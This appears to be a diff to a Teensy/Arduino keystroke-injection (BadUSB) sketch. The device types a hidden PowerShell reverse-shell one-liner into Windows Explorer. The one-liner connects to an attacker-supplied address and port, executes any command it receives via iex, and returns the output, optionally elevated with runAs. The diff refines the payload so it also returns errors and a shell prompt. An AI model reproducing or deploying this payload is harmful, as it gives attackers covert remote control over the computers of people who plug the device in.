@@ -94,8 +94,10 @@ void setup () {
   // Prepare the PowerhShell TCP Client
   String sPowerShellCmd = "powershell -w 1 "; 
   if (bAdmin) { sPowerShellCmd += "saps powershell -A '-W 1',{"; }  
-  sPowerShellCmd += "sal n New-Object;for($w=n byte[] 64kb){for($u=(n Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();";
-  sPowerShellCmd += "($i=$u.Read($w,0,64kb))-ne0){$v=($b=[text.encoding]::UTF8).GetBytes((iex $b.GetString($w,0,$i)|out-string));$u.Write($v,0,$v.Length)}}";
+  sPowerShellCmd += "sal n New-Object;for($w=n byte[] 64kb){for($u=(n Net.Sockets.TCPClient('";
+  sPowerShellCmd += sAddr + "'," + sPort + ")).GetStream();($i=$u.Read($w,0,64kb))-ne0){";
+  sPowerShellCmd += "$u.Write(($v=($b=[text.encoding]::UTF8).GetBytes(($b.GetString($w,0,$i)";
+  sPowerShellCmd += "|iex -ErrorV a|out-string)+$a+[char]10+'PS '+(pwd).Path+'> ')),0,$v.Length)}}";
   if (bAdmin) { sPowerShellCmd += "} -Verb runAs"; }
 
   // Open Explorer (Win+E)
@@ -105,14 +107,8 @@ void setup () {
   while (!digitalRead(iButtonPin3)) { ledBlink(1,50); }
 
   // Prepare to type in the path bar (Ctrl+F4 & Ctrl+A)
-  Keyboard.set_modifier(MODIFIERKEY_RIGHT_CTRL);
-  Keyboard.set_key1(KEY_F4);
-  Keyboard.set_key2(KEY_COUNTRY);
-  SEND_KEY;
-  Keyboard.set_modifier(0);
-  Keyboard.set_key1(0);
-  Keyboard.set_key2(0);
-  SEND_KEY;
+  pressKey(KEY_F4, MODIFIERKEY_RIGHT_CTRL);
+  pressKey(KEY_COUNTRY, MODIFIERKEY_RIGHT_CTRL);
   
   // Launch the TCP Client
   Keyboard.println(sPowerShellCmd);
